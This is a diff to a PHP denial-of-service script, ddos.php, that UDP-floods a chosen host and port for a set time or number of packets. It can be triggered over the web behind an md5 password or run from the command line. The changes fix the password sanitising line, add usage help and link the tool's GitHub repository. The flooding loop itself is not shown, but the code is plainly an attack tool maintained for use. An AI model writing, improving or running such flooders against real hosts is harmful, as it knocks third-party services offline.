@@ -1,7 +1,4 @@
 <?php
-//Server Usage:	http://127.0.0.1/ddos.php?pass=apple&host=DDoSTarget&port=PORT&time=SECOND
-//CLI Usage:		php ./ddos.php host=DDoSTarget port=PORT time=SECOND
-
 $cli=false;
 
 if(isset($argv)) {
@@ -13,8 +10,8 @@ if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset(
 	
 	// If executed from CLI no password
 	if($cli==false){
-		$pass = $_GET['pass'], ENT_QUOTES, 'UTF-8');
-		if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo $pass; exit();}
+		$pass = htmlspecialchars($_GET['pass'], ENT_QUOTES, 'UTF-8');
+		if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo "Wrong password!"; exit();}
 	}
 	
 	$packets = 0; 
@@ -67,11 +64,18 @@ if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset(
 	}
 	
 	if(!$cli){
-		echo "<br><b>DDoS UDP Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
+		echo "<br><b>DDoS UDP Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second<br>";
 	}else{
 		echo "\nDDoS UDP Flood --> " . $host . ":" . $port . "\nCompleted with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
 	}
 }else{ 
-	echo "Missing parameters.";
+	echo "\nMissing parameters!";
+	if(!$cli){
+		echo "<br><ul><li>Host parameter is always REQUIRED<li>Pass parameter is always REQUIRED<li>If you leave out the port parameter, a random port will be selected<li>You can use the time parameter (how much seconds keep the DDoS alive)<li>You can use the packet parameter (how much packets send to the target)<ul><li>If both are used, only time will be checked<li>If none is used the script will exit with \"Missing Parameters\" Error.</ul></ul><br>";
+		echo "More information on <a href=\"https://github.com/drego85/DDoS-PHP-Script\" target=\"_blank\">GitHub</a>";
+	}else{
+		echo "\n\n* host parameter is always REQUIRED \n* If you leave out the port parameter, a random port will be selected \n* You can use the time parameter (how much seconds keep the DDoS alive) \n* You can use the packet parameter (how much packets send to the target) \n\t* If both are used, only time will be checked \n\t* If none is used the script will exit with \"Missing Parameters\" Error. \n";
+		echo "\nMore information on https://github.com/drego85/DDoS-PHP-Script \n";
+	}
 }
 ?>
